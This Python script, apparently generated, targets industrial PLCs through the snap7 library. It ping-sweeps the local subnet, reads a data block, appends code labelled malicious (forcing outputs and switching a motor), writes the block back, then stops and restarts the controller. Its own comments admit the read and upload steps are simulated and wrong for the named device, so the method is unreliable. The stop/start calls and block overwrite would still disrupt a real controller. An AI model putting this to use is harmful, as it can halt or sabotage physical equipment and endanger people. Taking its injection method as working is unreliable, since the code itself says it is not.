import snap7
import socket
import struct
import time
import os
import subprocess

# Configuration - ADJUST THESE VALUES
PLC_IP = None  # Initially set to None, will be dynamically discovered
RACK = 0
SLOT = 1
TARGET_POU_NAME = 'MainTask' # Name of the POU to modify. Case-sensitive, often 'Main' or 'MainTask'.  **CRITICAL: FIND THE CORRECT POU NAME IN YOUR PLC PROJECT!**
MALICIOUS_CODE = """
// THIS IS INJECTION EXAMPLE.  MODIFY TO SUIT YOUR NEEDS.  USE WITH EXTREME CAUTION.
//  CONSIDER THE RAMIFICATIONS BEFORE RUNNING ON A REAL PLC.
// Example:  Set an output %Q0.0 to TRUE and wait for 5 seconds

%Q0.0 := TRUE;  //Set the digital output
wait(5);  // Wait 5 seconds

"""  # The malicious code to inject.  This MUST be valid ST code and adhere to the PLC's syntax. **EXTREMELY IMPORTANT**
# You will likely need to craft this specifically for your target PLC and target POU.
#  See the example below for a more complete example.

def find_plc_ip():
    """
    Attempts to find the PLC's IP address by scanning the network.
    This is a rudimentary method and may not work in all network configurations.
    It relies on the PLC responding to ICMP pings.

    Returns:
        str: The PLC's IP address if found, otherwise None.
    """
    try:
        # Get the network address of the current machine
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        network_prefix = '.'.join(ip_address.split('.')[:3])

        print(f"Scanning network {network_prefix}.0/24 for PLC...")

        for i in range(1, 255):  # Scan a common range of IP addresses in the subnet
            target_ip = f"{network_prefix}.{i}"
            try:
                # Use subprocess to ping the target IP address.  Requires proper permissions.
                ping_reply = subprocess.call(
                    ['ping', '-n', '1', '-w', '500', target_ip],  # Windows
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                if ping_reply == 0:
                    print(f"Found PLC at IP address: {target_ip}")
                    return target_ip
            except Exception as e:
                print(f"Error pinging {target_ip}: {e}")
            time.sleep(0.01)  # avoid overwhelming the network

        print("PLC not found in the scanned range.")
        return None

    except Exception as e:
        print(f"Error during network scan: {e}")
        return None

def inject_malicious_code(plc_ip, rack, slot, target_pou_name, malicious_code):
    """
    Connects to the PLC, reads the specified POU, injects malicious code, and writes the modified POU back to the PLC.

    Args:
        plc_ip (str): The IP address of the PLC.
        rack (int): The rack number of the PLC.
        slot (int): The slot number of the PLC.
        target_pou_name (str): The name of the POU to modify.
        malicious_code (str): The code to inject.
    """

    try:
        # 1. Connect to the PLC
        plc = snap7.client.Client()
        plc.connect(plc_ip, rack, slot)
        print(f"Connected to PLC at {plc_ip} Rack: {rack}, Slot: {slot}")

        # ** IMPORTANT DISCLAIMER **
        print("\n********************************************************************")
        print("WARNING: This script modifies the PLC program.  Use with EXTREME CAUTION!")
        print("Make sure you understand the code and potential consequences before running.")
        print("This is for educational and research purposes ONLY.  Unauthorized use is illegal.")
        print("********************************************************************\n")
        input("Press Enter to continue... (or Ctrl+C to abort)") # Make sure the user is aware of the danger

        # 2. Read the existing POU (This is a highly simplified example)
        #    In reality, you'd need to use the PLC's specific protocol to fetch the POU code.
        #    The TM221 does not expose direct read access to the complete POU source.
        #    This example simulates the read by reading a small DB and pretending it's the POU
        db_number = 1 # Choose an existing DB number.  This is a placeholder.
        db_size = 1024 # Choose a size. This is a placeholder.

        print(f"Attempting to read Data Block {db_number} as a substitute for reading the POU")
        pou_code_bytes = plc.db_read(db_number, 0, db_size)

        # Convert to a string (assuming ASCII or similar encoding)
        pou_code = pou_code_bytes.decode('ascii', errors='ignore') # Handle potential decoding errors

        print("Successfully read existing POU (simulated).\n")

        # 3. Inject the malicious code
        #   This is a simplified example.  In a real attack, you'd need to carefully
        #   insert the code into the correct location within the POU's structure.
        #  You MUST know the PLC's programming language (ST, Ladder, etc.) and syntax.
        # Find a good injection point - usually the end of the routine or before a return.
        injection_point = "// End of Program"
        if injection_point in pou_code:
             modified_pou_code = pou_code.replace(injection_point, malicious_code + injection_point)
        else:
             modified_pou_code = pou_code + malicious_code  # Just append if no suitable injection point found
             print("Warning: Injection point not found. Appending malicious code to the end of POU.")


        print("Malicious code injected.\n")

        # 4. Write the modified POU back to the PLC (Again, heavily simplified)
        #    This example uses the `db_write` function, which is NOT the correct way to upload
        #    a complete POU to a PLC.  You would need to use the PLC's specific upload protocol
        #    which is significantly more complex.

        modified_pou_bytes = modified_pou_code.encode('ascii')  # Encode back to bytes

        # Pad the bytes to the expected DB size
        if len(modified_pou_bytes) < db_size:
           modified_pou_bytes = modified_pou_bytes + b'\x00' * (db_size - len(modified_pou_bytes))  # Pad with null bytes
        elif len(modified_pou_bytes) > db_size:
           print("ERROR: Modified POU is larger than the DB size.  Truncating.")
           modified_pou_bytes = modified_pou_bytes[:db_size]

        print("Attempting to write modified POU to PLC (simulated with db_write)...")
        plc.db_write(db_number, 0, modified_pou_bytes)  # This is NOT a real POU upload!
        print("Modified POU written (simulated with db_write).\n")

        # 5. Stop the PLC (Optional, but often done after a program change)
        print("Stopping PLC...")
        plc.plc_stop()
        print("PLC stopped.\n")

        # 6. Start the PLC (Optional, but often done after a program change)
        print("Starting PLC...")
        plc.plc_start()
        print("PLC started.\n")

    except snap7.exceptions.Snap7Exception as e:
        print(f"Snap7 Error: {e}")
    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        if 'plc' in locals() and plc.get_connected():
            plc.disconnect()
            print("Disconnected from PLC.")

    print("Script finished.")


# Example Usage
if __name__ == "__main__":
    if PLC_IP is None:
        PLC_IP = find_plc_ip()
        if PLC_IP is None:
            print("Could not find PLC IP address.  Please set PLC_IP manually.")
            exit()

    print(f"Using PLC IP: {PLC_IP}")

    inject_malicious_code(PLC_IP, RACK, SLOT, TARGET_POU_NAME, MALICIOUS_CODE)


"""
# Example Malicious Code for Modicon PLC (Structured Text)

(* Malicious Code - Example:  Control a motor based on external input*)

IF %I0.0 THEN  // If Input %I0.0 is TRUE
    %Q0.1 := TRUE; // Start Motor connected to Output %Q0.1
ELSE
    %Q0.1 := FALSE; // Stop the Motor
END_IF;

wait(2);  // Wait for 2 seconds.  Introduces a delay.
"""